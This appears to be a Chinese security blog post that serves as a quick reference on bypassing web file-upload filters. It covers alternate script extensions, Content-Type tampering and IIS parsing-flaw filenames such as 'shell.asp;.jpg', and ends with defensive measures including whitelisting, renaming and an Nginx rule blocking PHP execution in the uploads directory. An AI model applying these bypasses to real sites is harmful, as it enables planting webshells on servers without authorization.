文件上传漏洞绕过技巧整理

发表于 2026-07-05 更新于 2026-09-01 分类于 Web 渗透 本文字数： 845 阅读时长 ≈ 3 分钟

0x00 前言

文件上传是拿 WebShell 最直接的入口，绕过姿势层出不穷。本文梳理常见的过滤方式 + 对应绕过手段，作为速查表使用。

仅用于合法授权环境的安全研究。

0x01 服务端常见过滤点

  1. 前端 JS 校验（仅限小白）
  2. MIME 类型校验（Content-Type）
  3. 后缀名黑名单
  4. 后缀名白名单
  5. 文件内容校验（magic number）
  6. 文件大小 / 重命名 / 重新渲染（如 GD 库处理图片）

0x02 绕过技术清单

1. 前端绕过

JS 校验：直接 BurpSuite 改包，或浏览器禁用 JS。

2. Content-Type 绕过

服务端只检查 Content-Type 就会放行。

3. 后缀名黑名单绕过

  • .php3 / .php4 / .php5 / .php7 / .phtml：PHP 别名
  • .phtm / .pht：PHP 解析配置
  • .phar：PHP 归档文件，部分配置会执行
  • .asp / .aspx / .cer / .asa：IIS
  • .jsp / .jspx：Java

0x03 解析漏洞

服务端就算过滤严格，配合服务器解析漏洞仍可拿 shell。

1. IIS 6.0 解析

  • shell.asp;.jpg → 当 asp 执行
  • 目录解析：xxx.asp/1.jpg → 目录下所有文件当 asp 执行

2. IIS 7.0/7.5（FastCGI）

shell.jpg/.php → jpg 当 PHP 执行。

0x04 代码层防御要点

1. 白名单（不是黑名单）

2. 重命名

避免原始文件名包含路径或恶意后缀。

3. 内容校验

  • 用 getimagesize() 校验图片（不只是 mime 头）
  • 用 ImageMagick 重渲染图片（去掉附加 payload）
  • 限制文件大小、宽高

4. 存储隔离

  • 上传目录禁止执行：Nginx location ~* /uploads/.*\.php$ { deny all; }
  • 上传目录单独域名 / CDN
  • 文件存储到对象存储（OSS / S3）

5. 路径处理

0x05 总结

文件上传是漏洞高发区。白名单 + 重命名 + 内容校验 + 禁止执行是黄金组合。永远不要信任用户传上来的文件名。
